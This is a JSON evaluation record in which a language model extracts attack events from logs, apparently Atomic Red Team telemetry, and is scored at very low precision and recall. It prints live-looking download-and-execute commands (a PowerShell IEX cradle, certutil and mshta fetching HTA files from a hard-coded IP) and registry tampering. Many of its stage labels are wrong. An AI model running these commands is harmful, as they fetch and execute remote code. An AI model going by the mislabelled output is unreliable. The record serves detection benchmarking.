@@ -1,0 +1,104 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "FileCoAuth.exe -Embedding",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2026B.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -nop -w hidden -c 'IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\04\u2026cmdline\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "net time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "ipconfig & arp -a & route print -4",
+        "stage": "Discovery"
+      },
+      {
+        "command": "invocation of AtomicRedTeam tests (multiple)",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.085.207:8082/Test.hta",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "An advanced attack sequence begins with remote code execution through PowerShell scripts downloaded from an unknown source, indicating Initial Access. The download and execution of additional payloads facilitate privilege escalation via dynamic compilation and DLL manipulation, suggesting Persistence mechanisms such as modifying system DLLs. After gaining elevated privileges, the attacker conducts extensive discovery activities, harvests credentials, establishes command and control channels through various tools like MSHTA and CertUtil, employs lateral movement techniques using Atomic Red Team attacks, and engages in defense evasion tactics to avoid detection while collecting sensitive data.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 80896,
+      "completion_tokens": 6852,
+      "total_tokens": 87748,
+      "wall_clock_s": 151.679,
+      "parse_retries": 3
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.15384615384615385,
+      "recall": 0.05405405405405406,
+      "f1": 0.08,
+      "tp": 2,
+      "fp": 11,
+      "fn": 35
+    },
+    "stage": {
+      "precision": 0.07692307692307693,
+      "recall": 0.02702702702702703,
+      "f1": 0.04,
+      "tp": 1,
+      "fp": 12,
+      "fn": 36,
+      "recall_partial": 0.04054054054054054
+    },
+    "hallucination_rate": 0.1,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 80896,
+      "completion_tokens": 6852,
+      "total_tokens": 87748,
+      "wall_clock_s": 151.679,
+      "parse_retries": 3
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
